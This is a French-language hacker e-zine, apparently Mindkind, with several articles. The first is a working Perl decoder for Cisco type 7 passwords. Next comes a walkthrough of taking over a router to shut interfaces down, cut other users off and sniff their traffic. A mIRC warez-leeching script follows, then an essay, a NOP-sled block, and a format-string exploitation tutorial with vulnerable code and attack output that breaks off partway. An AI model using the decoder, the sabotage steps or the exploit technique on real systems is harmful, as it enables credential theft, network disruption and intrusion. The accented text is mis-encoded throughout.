# for Cisco IOS password encryption facts.
#
@xlat = ( 0x64, 0x73, 0x66, 0x64, 0x3b, 0x6b, 0x66, 0x6f, 0x41,
          0x2c, 0x2e, 0x69, 0x79, 0x65, 0x77, 0x72, 0x6b, 0x6c,
          0x64, 0x4a, 0x4b, 0x44, 0x48, 0x53 , 0x55, 0x42 );
die 'τa marche de mΩme : "perl chisco.pl password"' if (not defined $ARGV[0]);
my $unf = $ARGV[0];
print "Pass crypter-poche : $unf\nPass dΘcryptΘ par 11/2 nain unijambiste: ";
if (!(length($ARGV[0]) & 1)) {
  $ep = $ARGV[0]; $dp = "";
  ($s, $e) = ($ARGV[0] =~ /^(..)(.+)/o);
  for ($i = 0; $i < length($e); $i+=2) {
    $dp .= sprintf "%c",hex(substr($e,$i,2))^$xlat[$s++];
  }
  $unf =~ s/$ep/$dp/;
}
print "$unf \n\n";

-------------------- cut here 8< --------------------

C'est plus cute la? heh
Pis tant qua faire si vous Ωtes vedge en plus d'avoir windows :
                           http://bdsltd.co.uk/network/cisco/GetPass.exe
On peut pas dire que je vous ai jamais rien donnΘ crue dans bouche :-P

Bon, alors vous  pouvez vous amuser  α comprendre l'algorithme  si vous voulez,
mais d'un seul coup  d'oeil de mΩme (j'ai  quand mΩme gossΘ un  gros 10 MINUTES
sur  le  code   lala)  τa  ma   dlair  d'une  clef   de  substitution  utilisΘe
intelligemment, mais la clef est facilement trouvable quand on a un password et
son rΘsultat cryptΘ donc cΘ de la vrai bouette.

Pour l'autre, le secret, vous l'avez s√rement reconnu, c'est du bon vieux MD5.

Pour en faire un rΘsumΘ, le "secret" c le pass pour se connecter sur le router,
pis le "password" cΘ le pass aprΦs enable. Il est a noter qu'on peut avoir  des
users aussi (genre on fait "login" aprΦs la premiΦre Θtape d'authentification),
et qu'ils sont encryptΘs avec le fameux type 7 (de password..).

Selon cisco, on devrait considΘrer ces passwords comme du plain text. hehehe

Pour un maudit bon paquet de dΘtails sur les derniΦres choses, allez voir
http://www.cisco.com/warp/public/701/64.html
c'est intΘressent.
D'ailleurs tout le site de cisco est trΦs intΘressent 
http://www.cisco.com/univercd/cc/td/doc/product/iaabu/idpg/intro.htm
IDS!
Et si vous voulez faire un overflow : http://www.cisco.com/warp/public/707/

Seul problΦme c'est que les chances  que vous touchiez a un firewall  Cisco une
fois dans vie sont pratiquement nulles, α moins que votre objectif de  carriΦre
soit : gars de chez Cisco qui configure des routeurs α 200$ de l'heure. heh

bon passons a autre chose...
interface FastEthernet0/1
 description interface for management 
 ip address 10.10.12.41 255.255.0.0
 speed 100
 full-duplex
!

interface for management.. interface comme management.. comment je fais pour 
me plugger la dessus putain...
...si je nslookup JessicaAlba, τa me donne :
Name:   JessicaAlba
Address:  10.10.12.41

J'vas prendre un 10 secondes de break pour ceux qui ont pas compris encore...

Et ben  oui! jme  suis connectΘ  sur jessicaalba  en telnet  pour pouvoir taper
toute ces  commandes! donc  l'interface que  vous voyez  la, c'est  l'interface
utilisΘe pour telnetter la machine!

Donc si vous  la disabler, vous  Ωtes dans marde...  par contre, kc  qu'on peut
faire si on veut mettre tlm dans marde sauf nous?
(Remarquez c'est pas une bonne chose, si vous voulez pas alerter personne)
interface FastEthernet0/0.130
 encapsulation dot1Q 130
 ip address 113.100.1.6 255.255.255.0
!

Cette interface  la s'occupe  du vlan  qui est  linkΘ avec  113.100.1.6 avec un
network de 255.255.255.0 ya fort α parier que de 113.100.1.1 α 113.100.1.254 ya
des affaires de pluggΘs dessus... que  vous pouvez faire planter avec le  reste
du monde...
interface FastEthernet0/0.133
 encapsulation dot1Q 133
 ip address 113.100.4.6 255.255.255.0
 ip ospf cost 100
!

Si j'fais un "show ip route", je vois

JessicaAlba #show ip route
Codes: C - connected, S - static, I - IGRP, R - RIP, M - mobile, B - BGP
       D - EIGRP, EX - EIGRP external, O - OSPF, IA - OSPF inter area 
       N1 - OSPF NSSA external type 1, N2 - OSPF NSSA external type 2
       E1 - OSPF external type 1, E2 - OSPF external type 2, E - EGP
       i - IS-IS, L1 - IS-IS level-1, L2 - IS-IS level-2, ia - IS-IS inter area

       * - candidate default, U - per-user static route, o - ODR
       P - periodic downloaded static route

Gateway of last resort is not set

C       113.100.4.0 is directly connected, FastEthernet0/0.133
C       113.100.1.0 is directly connected, FastEthernet0/0.130

Bon, donc si  je trouve une  machine dans le  network 113.100.4.0 et  que oh le
grand hasard c'est un autre routeur, je check sa routing table pis je vois :

S       113.100.1.0 [1/0] via 113.100.4.6

Bingo, je peux le rendre aveugle  sur les choses qu'il voit sur  le 113.100.1.0
si je lui barre le 113.100.4.6...

Vu comme τa, c'est assez simple α comprendre, le router sait par ou passer.. si
mettons  ce sont  des machines  ben vous  pouvez toujours  utiliser la  mΘthode
suivante au lieu de faire ip route :
Sending 5, 100-byte ICMP Echos to 113.100.4.6, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 1/2/4 ms

Le  ping c'est  rendu! C'est  un peu   normal car  le ip  de ma  machine  c'est
113.100.4.88  dans 255.255.255.0..  donc le  mΩme network.  maintenant  pignons
113.100.1.6 qui est PAS dans le mΩme network..
Sending 5, 100-byte ICMP Echos to 113.100.1.6, timeout is 2 seconds:
!!!!!
Success rate is 100 percent (5/5), round-trip min/avg/max = 1/2/4 ms
╟a marche!
Donc τa veut dire qui cette machine lα possΦde la route pour se rendre  l'autre
bord.. vous avez  donc juste α  figurer par vous-mΩme  que c'est le  router que
vous avez qui fait la job..  (c'est  pas toujours vrai, il peut  avoir d'autres
routers ailleurs, finalement une  autre  route que  celle qui passe   par notre
router... pour se rendre a la mΩme place.)

M'enfin, trΩve de plaisanteries, on veut que l'autre machine puisse pu voir  le
reste. Quoi faire? On a 2 choix,  dans le cas prΘsent on peut scrapper  le vlan
(vu que  c'est le  router qui  dΘcide dans  quel vlan  yΘ (avec dot1q), mais je
crois  qu'on  devrais  opter  pour  la  grosse  mΘthode  mΘchante  :   DISABLER
LINTERFACE!.  Autrement  dit,  c'est  tourner la  switch  on  a  off, pour  cet
interface la.

donc on rentre en mode de configuration :
JessicaAlba#conf t
Enter configuration commands, one per line.  End with CNTL/Z.
JessicaAlba(config)#
JessicaAlba(config)#interface FastEthernet0/0.133
JessicaAlba(config-subif)#shutdown 
JessicaAlba(config-subif)#exit
JessicaAlba(config)#exit

JessicaAlba#

C'est tout..
Si on retourne sur  notre machine cible, et  qu'on ping soit l'autre  interface
dans  le  mΩme  network  (celle qu'on  vienne  de  shutdowner)  ou ben  l'autre
interface qui Θtait router :
Sending 5, 100-byte ICMP Echos to 113.100.1.6, timeout is 2 seconds:
.....
Success rate is 0 percent (0/5)
et ben sa fouarre!
c le fun
maintenant pour le rΘenabler c'est :
  conf t
    int fa 0/0.133
    no shut
    exit
  exit
facile!

Sending 5, 100-byte ICMP Echos to 113.100.1.6, timeout is 2 seconds:
.!!!!
Success rate is 80 percent (4/5), round-trip min/avg/max = 1/2/4 ms

HUM
Faut spΘcifier que τa prend quand mΩme un ti peu de temps a un router pour
remettre son interface α "ON"... ;-)

Bon.. j'ai pensΘ longuement (2 gorgΘes  de biΦres, ~6 chips) a qu'est-ce  qu'on
pourrait faire  d'autre.. Ya  juste 2 choses qui me viennent en tΩte, faire une
route ip, et sniffer.

route ip in a nutshell :
on rentre dans le mode "configure terminal" (conf t)
ip route destination destinationmask ?
JessicaAlba(config)#ip route 1.1.1.0 255.255.255.0 ?
  A.B.C.D             Forwarding router's address
  Async               Async interface
  BVI                 Bridge-Group Virtual Interface
  CTunnel             CTunnel interface
  Dialer              Dialer interface
  FastEthernet        FastEthernet IEEE 802.3
  Lex                 Lex interface
  Loopback            Loopback interface
  Multilink           Multilink-group interface
  Null                Null interface
  Tunnel              Tunnel interface
  Vif                 PGM Multicast Host interface
  Virtual-FrameRelay  Virtual Frame Relay interface
  Virtual-Template    Virtual Template interface
  Virtual-TokenRing   Virtual TokenRing
ici on voit le help pour la suite..
en gros pour que notre router sache qui faut qu'il envoie au router 2.2.2.2
les packets destinΘs au network 1.1.1.0 on marque :
ip route 1.1.1.0 255.255.255.0 2.2.2.2 
et c'est tout..
on peut aussi spΘcifier une interface, ou carrΘment discarter :
ip route 1.1.1.0 255.255.255.0 fastEthernet 0/0.133
ip route 1.1.1.0 255.255.255.0 null 0 

Bon, maintenant.. sniffons.
N'oublier pas que ctun router, pis que sniffer sur un router c'est facile :
JessicaAlba#terminal monitor
JessicaAlba#debug ip packet 
IP packet debugging is on
IP: s=10.10.179.255 (FastEthernet0/1), d=10.10.255.255 (FastEthernet0/1), len 229, rcvd 3
IP: s=10.10.108.155 (FastEthernet0/1), d=10.10.255.255 (FastEthernet0/1), len 247, rcvd 3
IP: s=10.10.180.250 (FastEthernet0/1), d=10.10.255.255 (FastEthernet0/1), len 240, rcvd 3

ouhh
c cute
JessicaAlba#debug ip packet detail 
IP packet debugging is on (detailed)
JessicaAlba#
IP: s=10.10.194.222 (FastEthernet0/1), d=10.10.255.255 (FastEthernet0/1), len 263, rcvd 3
    UDP src=138, dst=138
IP: s=10.10.125.124 (FastEthernet0/1), d=10.10.255.255 (FastEthernet0/1), len 239, rcvd 3
    UDP src=138, dst=138

Mais disont que je m'en fou du FastEthernet0/1..
JessicaAlba#debug interface fastEthernet 0/0.133 
Condition 1 set

Donc lα, quand je vais faire debug ip packet detail, je vais avoir juste ce qui
passe par 0/0.133 (plus les loopbacks τa dlair). Donc, si je ping de ma machine
tant⌠t qui est α cotΘ de mon router τa me donne :
IP: s=113.100.4.88 (FastEthernet0/0.133), d=113.100.1.6, len 100, rcvd 4
    ICMP type=8, code=0
IP: s=113.100.1.6 (local), d=113.100.4.88, len 100, cef process switched
    ICMP type=0, code=0
IP: s=113.100.1.6 (local), d=113.100.4.88 (FastEthernet0/0.133), len 100, sending
    ICMP type=0, code=0
pour un ti ping

Si je telnet Jessica de mon autre machine τa me donne :
IP: s=113.100.4.88 (FastEthernet0/0.133), d=113.100.1.6, len 44, rcvd 4
    TCP src=58434, dst=23, seq=273281393, ack=0, win=4128 SYN
IP: s=113.100.1.6 (local), d=113.100.4.88, len 44, cef process switched
    TCP src=23, dst=58434, seq=1702304235, ack=273281394, win=4128 ACK SYN
IP: s=113.100.1.6 (local), d=113.100.4.88 (FastEthernet0/0.133), len 44, sending
    TCP src=23, dst=58434, seq=1702304235, ack=273281394, win=4128 ACK SYN
IP: s=113.100.4.88 (FastEthernet0/0.133), d=113.100.1.6, len 40, rcvd 4
    TCP src=58434, dst=23, seq=273281394, ack=1702304236, win=4128 ACK
IP: s=113.100.4.88 (FastEthernet0/0.133), d=113.100.1.6, len 58, rcvd 4
    TCP src=58434, dst=23, seq=273281394, ack=1702304236, win=4128 ACK PSH
IP: s=113.100.4.88 (FastEthernet0/0.133), d=113.100.1.6, len 40, rcvd 4
    TCP src=58434, dst=23, seq=273281412, ack=1702304236, win=4128 ACK
IP: s=113.100.1.6 (local), d=113.100.4.88, len 52, cef process switched
and so on..
Je pourrais regarder  τa avec vous,  mais me semble  que c'est simple?  pour le
ping, y'envoie un ICMP type 0 code 0, pis nous on le process pis on lui renvoie
la rΘponse mΩme chose pour la connexion TCP, y nous envoie un SYN, on  process,
on lui envoie un ACK... facile!
(Vous  avez  rien  comprit  de  TCP/SYN/ICMP?  allez lire  mon  autre  article,
Internet++ dans Mindkind10.. hehe)

JessicaAlba#no debug ip packet detail 
IP packet debugging is off (detailed)

Voila maintenant on se fait pu achaler par le debug!
C'est plut⌠t pratique comme commande, mais c'est crissement pas  conseillΘ  sur
une interface  utilisΘe grandement  : printer  le packet  gΘnΦre plus  de jus α
envoyer au telnet que le packet lui mΩme. Alors α moins d'avoir des  conditions
de  filterings  de  l'enfer.. faite  pas  un  debug ip  packet  detail  sur une
interface qui  roule α  1gig/sec.. hehe  j'ai jamais  essayΘ de  le faire, donc
jpeux pas vous dire si Cisco a mit une protection.. mais τa m'Θtonnerait :-)

Bon ben, c'est tout le temps que j'ai α mettre sur ces belles machines la..  Si
vous voulez taponner sur  une machine, le moyen  le plus facile c'est  dans les
Θcoles qui donnent les cours de Cisco, ils ont des chances d'avoir des  2600 et
des switchs. Par contre pour le GSR, ya que les backbones sur Internet qui  ont
τa, ou les compagnies qui ont des mautadis gros network locaux...


JessicaAlba# exit

au revoir Jessica ;-)

                                                                    - LastCall_


            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /               lastcall@mindkind.org                     /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'
	  
	  
	  


      TannΘ de taguer vos xdcc a main ? TannΘ des quotas de VidΘotron ? Et
      bien le script mIRC suivant va au moins rΘgler un de vos 2 problΦmes. 
      Effectivement, vous allez maintenant pouvoir downloader α partir d'un
      xdcc en un seul double click (dΘsoler pour les na∩fs qui croyaient
      pouvoir dire adieu α leurs quota).
      
------------------------------- 8< cut here 8< -------------------------------

------- remote ---------

on *:TEXT:*:#: {
  if ($chr(35) isin $1) {
    if (%wleech) {
      aline @warez-divx $nick $1 $4-
    }
  }
}

menu @warez-divx {
dclick: %wleechtxt = $sline(@warez-divx,1) | wleech %wleechtxt
}  
      

------- popups ---------
n1=-=Leech=-
n2=.warez/divx
n3=..$iif(!%wleech,activate):%wleech = on | window -lR @warez-divx 
n4=..$iif(%wleech,desactivate):unset %wleech
n5=..-

------------------------------- >8 cut here >8 -------------------------------





                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.07 Le petit guide de l'introspection                \        \     !
     .             d'une assemblΘe d'illusions                 \        \    .
     ;       aka Le mirroir de l'Θvolution                      \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

AprΦs la roue, la vie paisible s'Θtait Θtablie dans les terres de ce monde sans
frontiΦre. L'expansion ne s'arrΩtait pas ni mΩme la progression  technologique.
La roue, puis la charrette, puis l'invention des chevaux ! Peut importe l'ordre
chronologique des inventions, une chose est s√re, l'homme se croit maεtre de ce
que ses sens perτoivent. S'il Θtait capable de toucher α sa femme, et bien elle
Θtait sienne. S'il pouvait tuer son  ennemi, alors son Γme devenait sienne.  Ce
qu'il ne  pouvait pas  toucher appartenait  au domaine  du mystΘrieux. L'humain
vΘnΘrait  la  Lune,  le  Soleil,  l'horizon.  Son  empire  a  grandit  avec les
dΘcennies. Il a maεtrisΘ l'eau avec  ses galΦres plus dangereuses les unes  que
les autres pour aller s'Θtablir en Inde. La dΘmographie a augmentΘe, l'Θconomie
de  mΩme. Son  estime et  sa grandeur  ont enflΘs  pour le  mettre au  haut  de
l'Θchelle alimentaire. Il est le meurtrier, il est le dominant. 

Puis est venu l'Θpoque des fusils. Fini les batailles d'armures, l'intelligence
accrue a apportΘ les guerres de tranchΘes. Guerre Mondiale 1 et Guerre Mondiale
2. L'Φre atomique n'Θtant plus α la mode, nous sommes rendus avec de  nouvelles
armes. Les McDonalds et ses  dΘrivΘs prennent d'assaut les territoires  occupΘs
sans que  personne ne  riposte. Nous  en sommes  lα. Environ  2000 ans  se sont
ΘcoulΘes depuis  la date  inscrite sur  la Bible. Nous sommes  si intelligents.
Chaque enfant a sa tΘlΘvision, son gameboy couleur, son ordinateur familial  et
sa connexion haute-vitesse. Que demander de plus α l'Θvolution ? La roue a fait
suffisamment de chemin. Nous  sommes vraiment intelligents. Chaque  matin, tout
le monde se lΦve  pour assurer la prospΘritΘ  des gΘnΘrations α venir.  Plus la
cravate est longue, plus  la rΘussite est grande.  La vie roule α  son plein et
tout va trop vite selon certains. Un problΦme se pose. Les dΘpressions sont  en
nombre  grandissant.  La  marge des  diffΘrentes  classes  Θconomiques augmente
affreusement. Le taux de cholestΘrol devient Θnorme. Ces problΦmes ne sont plus
des problΦmes, car nous sommes  des humains intelligents et responsables.  Nous
avons  trouvΘs une  solution qui  est :  "Engageons des  scientifiques  et  des
chercheurs pour  trouver les  rΘponses". Ne  voyez-vous pas  toute l'idiotie de
cette  si  brillante idΘe  ?  Comment faire  grandir  une population  si  cette
population ne fait que consommer et surconsommer ? Ne voyez-vous pas la  grosse
vieille illettrΘe assise sur sa chaise α regarder ses romans savons α  longueur
de journΘe ?  Ne voyez-vous pas  l'alcoolique qui travaille  dans son usine  de
bacon α attendre innocemment  la fin de son  quart ? Et ne  voyez-vous pas tous
ces enfants  droguΘs qui  ont foi  en la  facilitΘ des  choses, toujours prΩt α
aller  fΩter en  demandant un  peu de  sous α  leurs parents.  Nous sommes  une
sociΘtΘ d'irrationalitΘ. 

Donner le savoir α la minoritΘ pour que les autres baignent dans l'ignorance et
la prΘcaritΘ n'apportera  pas grand chose  α la soi-disante  Θvolution humaine.
Nous  en sommes  donc ici  α se  demander le  rΘel bienfait  de ces  recherches
incessantes. Les mΘdecins tentent de faire vivre le plus longtemps les humains,
mais ces  humains auraient-ils  tout simplement  peur de  mourrir ?  L'humain a
peur,  terriblement  peur  du  mystΘrieux. C'est  pourquoi  il  essaie  de tout
maεtriser. Autrefois,  il ne  comprenait pas  la Lune,  maintenant il essaie de
voir  plus loin  que la  vie. L'humain  se croit  maεtre de  ce  que  ses  sens
perτoivent, mais il ne se rend pas  compte que c'est tout α fait l'inverse.  Ce
que ses sens perτoivent deviennent maεtre de lui-mΩme. L'humain s'enchaεne α ce
monde matΘriel  parce qu'il  a peur.  Il s'acharne  a essayer  de vivre l'amour
parce  qu'il  dΘsire  s'attacher  α la  vie.  L'Θvolution  est  donc remise  en
question. AprΦs avoir  dΘpassΘ la limite  de la survie,  l'humain n'a cessΘ  de
contr⌠ler son monde mais sans s'arrΩter pour se demander si c'Θtait nΘcessaire.
Donc, est-ce rΘellement nΘcessaire d'avoir  700 canaux de tΘlΘvisions ?  Est-ce
rΘellement nΘcessaire de se faire greffer un nouveau foie lorsque le vieux sera
ΘpuisΘ ?  Est-ce vraiment  nΘcessaire de  vivre ?  Vous fuyez  la mort. Dans ce
monde d'illusions, l'humain s'attache  dΘsespΘrΘment α ce qu'il  croit dominer.
Comme dirait  le bon  proverbe des  personnes sans  grandeur : "C'est effrayant
qu'en l'an 2000 τa  se produise encore !",  et ce avec toute  l'ironie que cela
apporte. Si  rusΘ et  sournois qu'est  cet humain  qu'il ne  voit mΩme  pas son
comportement. Ce texte  ne changera rien  parce que l'humain  est douΘ dans  la
stupiditΘ. Parmis  toute forme  de vie  existante, l'humain  est dΘcidΘment  la
moins ΘvoluΘe...

SincΦrement,

nothing94

web : http://nothing94.250x.com




            ___                                                           ___
     .----/   /----------- ---------- --------- - -- - - --- -----------/   /
     |   /   /                                                         /   /|
     :  /   /                                                         /   / :
     | /   /                 dieforyoursins@hotmail.com              /   /  |
     |/   /                                                         /   /   | 
     /___/-- ---------- -----  ----------------- - ------- -- --- -/___/----'




      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90      
      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90      
      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90      
      \x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90
      
      
                            Null si decouvert.      
      
      
      
            
                                                        __ ______
            __    __  __  _ ___   __       _  _   _   _\_ _  _   \
           /  \  /  \ \ \ \  _ \ \ .\     | |/ / / / / _  / /.\   \
     .- - / /\ \/ /\ \-\_\ \_\\_\-\_/ ----|   < /_/-/_//_/\/__/    \-  ------. 
     :    \ \ \__/ / /                    |_|\_\           \        \        : 
     ,     \/      \/                                       \        \       |
     :                                                       \        \      .
     . 11.08 Format string attack                             \        \     !
     .             aka                                         \        \    .
     ;       Un trio fmt svp                                    \        \   :
     :                                                           \        \  :
     '-- -----  - -------- --- --------- - --  ------------- --- -\        \-'
                                                                   \____ _ _\
                                                     

--[ Introduction : 

Dans  un monde  o∙ le  domaine de  la sΘcuritΘ  informatique est  en  constante
Θvolution et o∙ les  progrΦs se font rapidement,  la guerre de l'information se
dΘroulant entre ceux qui cherchent α pousser le hacking et ceux qui cherchent α
l'Θliminer est fΘroce.

Les techniques  afin d'escalader  les niveaux  de privilΦge  ont aussi  changΘ.
Rappelons-nous les  stack overflows  simple d'antan,  o∙ il  ne  suffisait  que
d'Θcraser notre pointeur d'instruction [1]. Regardons maintenant les techniques
d'aujourd'hui, par  exemple dans  l'exploit de  MaXX, qui  consiste α saisir le
contr⌠le du programme avec l'aide d'un off-by-one heap overflow. [2]

Dans cet article, il sera question de techniques pour faciliter  l'exploitation
d'une erreur  de formatage.   En effet,  lorsque nous  prenons une  attaque par
format string,  plusieurs portes  s'offrent α  nous afin  de pouvoir prendre le
contr⌠le du programme.  Il est possible de faciliter le processus de  plusieurs
faτons qui  nous aidera  α atteindre  l'objectif dΘsirΘ,  comme par  exemple de
directement Θcrire notre shellcode en mΘmoire ;) 



--[ Un petit rappel :

MΩme si les erreurs de formatage se font de plus en plus rares de nos jours, et
qu'elles  sont  facilement  dΘtectables  avec  des  outils  d'automatisation de
dΘtection de  failles, il  reste que  c'est une  faille de  sΘcuritΘ qui  reste
intΘressante α exploiter.

Afin de  pouvoir contourner  le programme  vulnΘrable α  l'erreur de formatage,
nous devons dΘfinir les diffΘrents points de la tΓche afin de parvenir α  notre
objectif. 

- Identifier la faille
- Trouver la distance et le padding pour
  avoir le contr⌠le de notre format string
- Trouver quel endroit en mΘmoire Θcraser (retloc)
- Trouver la valeur que nous allons Θcraser retloc avec (retadr)
- BΓtir notre buffer et puis l'injecter.

Avec une telle attaque, il est briΦvement possible d'Θcrire ce que nous voulons
en mΘmoire,  ce qui  consΘquemment nous  laisse un  grand choix  pour saisir le
contr⌠le du programme.  Il existe  plusieurs faτon de prendre le  contr⌠le d'un
programme  lorsque  nous avons  un  certain contr⌠le  sur  ce qui  se  passe en
mΘmoire, que ce soit [3]:

- en Θcrasant des entrΘes dans la Global Offset Table (GOT)
                              afin d'hijacker une fonction, 
- en ajoutant une entrΘe dans la table de destructeurs (.dtors),
- en falsifiant le contenu d'un boundary tag lors d'une
                         allocation dynamique (malloc),
- ou bien tout simplement en Θcrasant EIP/EBP dans un stack frame 
                                        lors d'un stack overflow.



--[ Le problΦme : 

Lorsque nous essayons d'exploiter et de prendre le contr⌠le d'un tel  programme
au  moyen  d'une  attaque,  le succΦs  de  l'exploitation  dΘpend  de plusieurs
paramΦtres dynamiques (distance,  padding, retloc, retadr).   Dans le pire  des
environnements, il peut Ωtre trΦs difficile d'obtenir ces paramΦtres.  

Il est toujours possible de bruteforcer plusieurs de ces valeurs, mais plus  le
nombre  d'offsets  α trouver  augmente,  plus le  bruteforce  va Ωtre  long  et
pΘnible.  Donc lorsqu'il est possible  de diminuer ces valeurs inconnues,  nous
possΘdons plus de chances pour que notre exploit fonctionne.



--[ Les dΘtails :

Nous avons dΘcrit plus haut qu'il  Θtait possible d'Θcrire ce que nous  voulons
en  mΘmoire.  Nous  savons aussi  que lorsque  nous exploitons  une  erreur  de
formatage, les deux valeurs les plus importantes α trouver sont quelle  adresse
nous voulons modifier, et avec quelle valeur nous voulons modifier celle-ci.

Ce qui  est intΘressant  α noter,  c'est que  les erreurs  de formatage ne nous
permettent  pas  seulement d'Θcrire  4  bytes en  mΘmoire.   En effet,  il  est
possible d'Θcrire une chaεne de  texte de n'importe quelle longueur,  en autant
que notre buffer est assez grand pour contenir notre format string malΘfique.



--[ Un strcpy improvisΘ

Je vous  prΘsente ici  une fonction  qui nous  permettra de  gΘnΘrer un  format
string qui va Θcrire α un  certain endroit en mΘmoire une chaεne  de caractΦres
de  notre choix.   Vous allez  s√rement rapidement  comprendre l'utilitΘ  d'une
telle fonction ;)

void write_string_fmt (char *buffer, int dist, int align, int retloc, char *what, int mode) 

- buffer : Le buffer qui contiendra la format string
- int dist : La distance jusqu'au dΘbut du buffer que nous contr⌠lons
- int align : Une valeur de 0 α 3 dΘfinissant l'alignement sur 4 bytes
- int retloc : L'endroit que o∙ nous voulons Θcrire la string
- char *what : La string que nous voulons placer α retloc
- int mode : 1 pour le mode d'alignement, et 2 pour Θcrire en mΘmoire.
(le  mode  d'alignement  nous  permet  de  trouver  exactement  la  distance et
l'alignement pour atteindre notre buffer, tandis qu'avec 2 nous voulons  Θcrire
en mΘmoire; voir code)

	Prenons un simple exemple de code vulnΘrable.   :

--[ test.c
/*
   coded by g463
*/

#include &lt;stdio.h>
#include &lt;stdlib.h>

int
main (int argc, char *argv[]) {

     char *string = (char *) malloc (1024);

     strcpy (string, "jonny boy!!! ;)");

     printf ("\nRETLOC (Adresse de string) -> 0x%x\n", (int) string);
     printf ("string avant attaque -> %s\n", string);
     printf (argv[1]); // ayoyoyoyoyoyoyoyoye :-P
     printf ("\nstring apres attaque -> %s\n", string); 

     return 1;
}
--] eof 

guaylejs@ariel [~/codez/format_string/mindkind]$ gcc test.c -o test
guaylejs@ariel [~/codez/format_string/mindkind]$ ./test

RETLOC (Adresse de string) -> 0x8049708
string avant attaque -> jonny boy!!! ;)

string apres attaque -> jonny boy!!! ;)
guaylejs@ariel [~/codez/format_string/mindkind]$

Ce que nous voulons faire, c'est  exploiter l'erreur de format afin de  pouvoir
changer la string  que nous allons  imprimer α l'Θcran  la deuxiΦme fois.   Si,
lors de l'exploitation normale d'une format string nous pouvons Θcrire 4  bytes
et saisir le contr⌠le du programme, alors pourquoi ne pas essayer d'Θcrire  une
chaεne de caractΦres au complet α un certain endroit en mΘmoire ? 

PremiΦrement,  prenons note  de la  valeur de  retour de  la  fonction  malloc.
Malloc nous retourne un  pointeur vers la zone  de mΘmoire allouΘe, qui  est en
l'occurrence la zone mΘmoire que nous voulons aussi Θcraser.  

guaylejs@ariel [~/codez/format_string/mindkind]$ ltrace ./test | grep malloc
malloc(1024)                                      = 0x08049708
guaylejs@ariel [~/codez/format_string/mindkind]$

Donc nous voyons que  la valeur que nous  voulons rΘ-Θcraser en mΘmoire  est de
0x08049708, c'est-α-dire notre retloc.

Ensuite, trouvons la distance et le  padding dont nous avons besoin pour  avoir
le contr⌠le sur la chaεne.  Rappelons-nous que le 'mode 1' est utilise  lorsque
nous voulons  trouver l'alignement  et le  padding, tandis  que le  'mode 2' va
Θcrire  nos valeurs  en mΘmoire.   Pour trouver  le bon  alignement et  le  bon
padding, nous devons avoir notre search-value, 0x41414141, tout de suite  aprΦs
le dernier point (.), alignΘ sur 4  bytes.  Ce qui va vouloir dire qu'α  partir
de maintenant, nous avons le contr⌠le sur notre buffer.  Vous pouvez  retrouver
une copie du code lib.c que j'utilise dans les exemples ainsi que les fonctions
qui gΘnΦrent  les format  strings α  la fin  de l'article.  Voyons voir, disait
l'aveugle :  

guaylejs@ariel [~/codez/format_string/mindkind]$ ./lib 110 0 0x8049708 test 1

[debut du  garbage...]

. 8049708. 8048451. 8049620. 80496e8.bfffea98.4004bbe8.4013a290.4000acf0. 
8049708.bfffeac8.40038326.       2.bfffeaf4.bfffeb00. 8048540. 
0.bfffeac8.400382f6.40015094.       2. 8048380.bfffeaf4.40038268.40138ac8. 
0. 80483a1. 8048470.       2.bfffeaf4. 80482e4. 
8048540.4000b3c0.bfffeaec.40015634.       2.bfffebf2.bfffebf7. 
0.bffffbf8.bffffc11.bffffc20.bffffc31.bffffc3f.bffffc49. 
bffffc5c.bffffc79.bffffc84.bffffc92.bffffd29.bffffd39.bffffd4e.bffffd5e.bffffd7
0. 
bffffd77.bffffd9f.bffffdad.bffffdef.bffffdf7.bffffe09.bffffe2a.bffffe37.bffffe3
f.bfffffed. 0.      10.  8001bf.       6.    1000.      11.      64.       3. 
8048034.       4. 20.       5.       6.       7.40000000.       8.       0. 
9. 8048380.   b.     cf6.       c.     cf6.       d.     34d.       e.     34d. 
f.bfffebed.       0.       0.       0.       0.       0.38356900.65740036. 
41007473.be414141. -------------------------------------------------------- ---
---------------^^---------^^^^^^ 8babeba.be080497. 9babeba.be080497. 
ababeba.be080497. bbabeba.be080497. cbabeba 
7722773992e783825 
7796306292e783825     7796306292e783825                     

[fin du garbage...]

Comme nous  le voyons  lors du  output de  notre programme,  notre search value
0x41414141 n'est pas tout a fait  la valeur aprΦs le dernier point.   La valeur
aprΦs le  dernier point  est  0xcbabeba.   Essayons maintenant  de creuser plus
profondΘment dans la stack, avec une plus grande distance :  

guaylejs@ariel [~/codez/format_string/mindkind]$ ./lib 101 0 0x8049708 test 1

[debut du garbage...]

. 8049708. 8048451. 8049620. 80496e8.bfffea98.4004bbe8.4013a290.4000acf0. 
8049708.bfffeac8.40038326.       2.bfffeaf4.bfffeb00. 8048540. 
0.bfffeac8.400382f6.40015094.       2. 8048380.bfffeaf4.40038268.40138ac8. 
0. 80483a1. 8048470.       2.bfffeaf4. 80482e4. 
